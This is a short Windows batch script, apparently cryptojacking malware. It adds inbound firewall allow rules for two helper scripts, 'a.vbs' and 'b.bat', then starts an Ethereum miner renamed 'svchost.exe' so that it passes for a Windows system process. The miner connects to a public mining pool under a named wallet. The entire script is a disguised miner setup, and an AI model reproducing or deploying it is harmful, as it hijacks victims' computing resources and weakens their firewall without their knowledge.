netsh advfirewall firewall add rule name="a.vbs" dir=in action=allow program="C:\sys\a.vbs" enable=yes
netsh advfirewall firewall add rule name="b.bat" dir=in action=allow program="C:\sys\b.bat" enable=yes

svchost.exe -a ethash -s eu1.ethermine.org:5555 --ssl -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.e1qu1egkhhw81n2 --intensity 5
pause
